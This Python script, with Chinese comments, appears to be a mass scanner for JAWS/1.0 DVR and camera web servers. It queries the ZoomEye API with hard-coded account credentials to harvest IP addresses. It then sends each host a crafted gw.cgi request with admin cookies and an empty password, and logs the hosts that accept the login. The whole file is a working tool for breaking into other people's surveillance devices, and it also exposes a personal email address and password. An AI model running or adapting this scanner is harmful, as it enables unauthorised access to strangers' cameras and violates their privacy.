#!/usr/bin/python
#-*- coding=utf8 -*-
import re
import sys
import json
import time
import queue
import urllib
import requests
import threading

global i
global port
user = '157303749@qq.com'
password = 'mypasswordisnull12312'     #用于登录telent404的账号密码


passwd = ""

class Scanner:
   def __init__(self):
       self.page=1
       self.threads_max=10
       self.queue = queue
       self.contral = "true"
       self.threads = []
       self.raw_urls =list()
       self.word_list = []     #用于去重
   def check_user_pwd_actoken(self):
       data = {'username': user, 'password': password}
       check = requests.post(url='https://api.zoomeye.org/user/login', json=data)
       try:
               access_token = check.json()#返回用于查询的access_token
               print("[+]连接成功")
               return access_token
       except:
               print("[-]连接失败")

   def findurl_andsave(self):
       access_token = self.check_user_pwd_actoken()
       mode = "host"             ##
       query = "JAWS/1.0"        ##
       headers_authorization = {'Authorization': 'JWT ' + access_token["access_token"]}
       a=[]
       while self.page<=20:#try:
               req = requests.get(
                   url='https://api.zoomeye.org/' + mode + '/search?query=' + query + "&page=" + str(self.page),
                   headers=headers_authorization)
               #print(req.content)
               req_json = req.json()
               for line in req_json["matches"]:
                        a.append(line["ip"] + ":" + str(line["portinfo"]["port"]) + "\n")
               self.raw_urls.extend(a)
               print("已录入："+str(self.page))
               print(self.raw_urls)
               self.page+=1

           #except:
               #print("[-]查询时发生错误")
       self.raw_urls = set(self.raw_urls)
       with open("zoomeye_raw.txt","w")as f:
          f.writelines(self.raw_urls)
       f.close()
       print("[+]录入zoomeye_raw.txt完成")


   def read_url(self):
       with open("zoomeye_raw.txt") as f:
          for line in f.readlines():

            host = line.split(":")
            self.ip = str(host[0])
            self.port = str(host[1])
            self.port = self.port.replace("\n", "")
            #print(self.ip + ":" + self.port)
            self.headers = {
                'Host': self.ip,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
                'Referer': "http://" + self.ip + "/",
                'Accept': "*/*",
                'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
                'X-Requested-With': 'XMLHttpRequest',
                'Cookie': 'lxc_save=admin%2c' + passwd + ';dvr_camcnt=16;dvr_clientport=' + self.port + ';dvr_sensorcnt=4;dvr_usr=admin;dvr_pwd=' + passwd + ';iSetAble=1;iPlayBack=1',
                'Connection': 'close'
            }
            a = '<juan ver=\"\" squ=\"\" dir=\"0\"><rpermission usr=\"admin\" pwd=\"' + passwd + '\"><config base=\"\"/><playback base=\"\"/></rpermission></juan>'
            b = urllib.parse.quote(a)  # 对a进行URL编码
            ti = int(time.time())  # 获取当前距离元点的时间，整数
            data = "xml=" + b + "&_=" + str(ti)
            self.url = "http://" + self.ip + "/cgi-bin/gw.cgi?" + data  # 提交的url
            if threading.activeCount() >= self.threads_max:
                time.sleep(0.8)
                #print(threading.activeCount())
                #print("sleep")
                ip = self.ip
                url = self.url
                port = self.port
                t = threading.Thread(target=self.req_test, args=(url, ip, port))
                t.start()
            else:
                #print("work")
                ip=self.ip
                url=self.url
                port=self.port
                t = threading.Thread(target=self.req_test,args=(url,ip,port))
                t.start()
            #self.req_test()
   def req_test(self,url,ip,port):
          #print("[+]req_test:"+self.ip)
          #print("100")
        try:
          req = requests.get(url, headers=self.headers)
          length = req.headers['Content-Length']
          #print("[+]"+self.ip+":"+self.port+",len:"+length)
          if (length == "175"):              #返回页面length=175,登录成功
              print("[HERE]"+ip +":"+port+ " HaS NULL PasswD")
              try:
                   files = open("jaws_（有重复）.txt", "a")
                   data = ip +":"+ port
                   files.write(data)
                   files.write("\n")
                   files.close()
              except:
                   print("[-]打不开文件"+ip + "--" + passwd + "--")
          else:
                 print("[-]"+ip+":"+port)
        except:
            print("[--]"+ip+":"+port)
   def repeat_setter(self):
     try:
        with open(sys.argv[-1])as f:
            for line in f.readlines():
                self.word_list.append(line)

                self.word_list = list(set(self.word_list))
        try:
            files = open("jaws_空密码.txt", "a")
            files.writelines(self.word_list)
            files.close()
        except:
            pass
     except:
        print("读写出错...")
   def Mian(self):
       self.findurl_andsave()
       self.read_url()
       self.repeat_setter()

if (__name__=="__main__"):
   S1=Scanner()
   S1.Mian()
   if not(S1.req_test):
      print("-----------end--------------")



